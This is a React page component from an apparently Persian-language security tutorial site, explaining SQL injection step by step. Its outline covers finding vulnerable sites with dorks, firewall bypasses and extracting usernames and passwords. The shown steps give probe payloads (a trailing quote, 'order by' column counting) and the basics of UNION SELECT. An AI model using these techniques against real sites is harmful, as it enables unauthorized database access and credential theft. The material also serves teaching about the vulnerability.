/** @format */

import { Code, TextNote } from '@/app/Components/common'
import { LI, UL } from '@/app/Components/List'
import { PageLayout } from '@/app/Components/PageLayout/page-layout'

const SqlInjection = () => {
  const url = 'https://test.com/post.php?id=10'
  return (
    <PageLayout
      title='SQL Injection'
      breadcrumb={[
        { title: 'فهرست مستندات', href: '/' },
        { title: 'هک و امنیت', href: '/security' },
        { title: 'کلوپ ۱', href: '/security/club-1' }
      ]}>
      <UL title='مراحل انجام کار'>
        <LI title='۱'>پیدا کردن سایت آسیب پذیر از طریق dork</LI>
        <LI title='۲'>تزریق دستورات به دیتابیس برای جمع آوری اطلاعات</LI>
        <LI title='۳'>اعمال bypass های مختلف برای دور زدن پالیسی های فایروال، وب سرور و... در صورت دریافت خطا</LI>
        <LI title='۴'>نمایش اطلاعات مهم نظیر یوزرنیم و پسورد و... روی سایت</LI>
      </UL>
      <UL title='شروع کار'>
        <LI simple={false} title='مرحله اول'>
          <p>با قرار دادن کاراکتر تک کوتیشتن در انتهای url کار را شروع می کنیم.</p>
          <Code>{`${url}'`}</Code>
          <p>
            در صورتی که تعداد آیتم های نمایش داده شده در سایت تغییر کند، یا خطایی روی صفحه مشاهده شود و یا بصورت کلی در
            صورتی که با اضافه کردن کوتیشن به انتهای url تغییری در نوع نمایش صفحه نسبت به حالت بدون کوتیشن مشاهده شود
            احتمال وجود آسیب پذیری SQL Injection وجود دارد .
          </p>
          <Code>1) Before Quate: $query = 'SELECT id, name, category_id from posts WHERE id = 10' </Code>
          <Code>2) After Quate: $query = 'SELECT id, name, category_id from posts WHERE id = 10''</Code>
          <p>
            در حالت دوم قرار گرفتن دو کوتیشن پشت سر یکدیگر باعث بروز خطای سینتکسی و تغییر نتیجه کوئری می شود‌(در صورت
            وجود آسیب پذیری SQL INJECTION)
          </p>
          <TextNote>
            هدف: سعی در ایجاد خطای سینتکسی در کوئری برای اطمینان از اینکه بک اند دیتای ورودی کاربر را مستقیما در کوئری
            جایگزین می کند.
          </TextNote>
        </LI>

        <LI simple={false} title='مرحله دوم'>
          <p>در این مرحله اولین دستوری که تست میکنیم به صورت زیر می باشد:</p>
          <Code>{url} order by 159951159--</Code>
          <TextNote>
            هدف: دستور زیر خروجی را بر اساس 159951159 مین ستون مرتب می کند! که با توجه به بزرگ بودن این عدد، ستون
            159951159 ام پیدا نمی شود و با با حطا مواجه می شویم.
          </TextNote>
          <Code>order by 159951159--</Code>

          <p>اتفاقی که در دیتابیس رخ می دهد بصورت زیر است:</p>
          <Code>1) Main Query: SELECT id, name, category_id from posts WHERE id = 10 another sql statements...</Code>
          <Code>
            2) After Injection: SELECT id, name, category_id from posts WHERE id = 10 ORDER BY 159951159-- another sql
            statements...
          </Code>
          <Code>2) Result: SELECT id, name, category_id from posts WHERE id = 10 ORDER BY 159951159--</Code>
          <p>
            در صورتی که دستور بالا باعث ایجاد خطا در کوئری شود به سراغ مراحل بعد می رویم اما در صورت عدم وجود خطا دستور
            زیر را امتحان می کنیم
          </p>
          <Code>{url}' order by 159951159--+</Code>
          <p>
            در صورت نمایش خطا باید تعداد ستون های موجود در کوئری را با سعی و خطا پیدا کنیم. برای این کار عدد 159951159
            را کاهش می دهیم. مثلا 10. در صورت نمایش اطلاعات عدد را افزایش می دهیم. این کار را تا زمانی ادامه می دیهم که
            اطلاعات پست ها نمایش داده نشود. فرضا این اتفاق روی عدد 18 رخ می دهد. در نتیجه تعداد ستون های موجود در کوئری
            برابر ۱۷ می باشد
          </p>
        </LI>
      </UL>

      <p>
        در این مرحله باید از دستور union select استفاده کنیم. دستور union select دستوری است که می توانیم دو کوئری را به
        هم وصل کنیم و دیتا را نمایش دهیم. شرط اجرای دستور union select این است که تعداد ستون های کوئری ها باهم برابر
        باشد/
      </p>
      <Code>1) SELECT id, name, category_id from posts</Code>
      <Code>2) SELECT id, name, category_id from posts UNION SELECT 1,2,3</Code>
      <p>در کوئری اول خروجی فرضی به صورت زیر است. با فرض اینکه تعداد پست های موجود در دیتابیس ۳ باشد.</p>
      <table>
        <tr>
          <td>id</td>
          <td>name</td>
          <td>category_id</td>
        </tr>
        <tr>
          <td>1</td>
          <td>Post 1</td>
          <td>Category 2</td>
        </tr>
        <tr>
          <td>2</td>
          <td>Post 2</td>
          <td>Category 5</td>
        </tr>
        <tr>
          <td>3</td>
          <td>Post 10</td>
          <td>Category 6</td>
        </tr>
      </table>
      <p>در کوئری دوم خروجی فرضی به صورت زیر است. با فرض اینکه تعداد پست های موجود در دیتابیس ۳ باشد.</p>
      <table>
        <tr>
          <td>id</td>
          <td>name</td>
          <td>category_id</td>
        </tr>
        <tr>
          <td>1</td>
          <td>Post 1</td>
          <td>Category 2</td>
        </tr>
        <tr>
          <td>2</td>
          <td>Post 2</td>
          <td>Category 5</td>
        </tr>
        <tr>
          <td>3</td>
          <td>Post 10</td>
          <td>Category 6</td>
        </tr>
        <tr>
          <td>1</td>
          <td>2</td>
          <td>3</td>
        </tr>
      </table>
      <p>در مرحله بعد</p>
      <p>مقادیر ۱و۲و۳ موجود در UNION SELECT به کوئری اضافه شده و در سایت مشخص می شود.</p>
    </PageLayout>
  )
}
export default SqlInjection
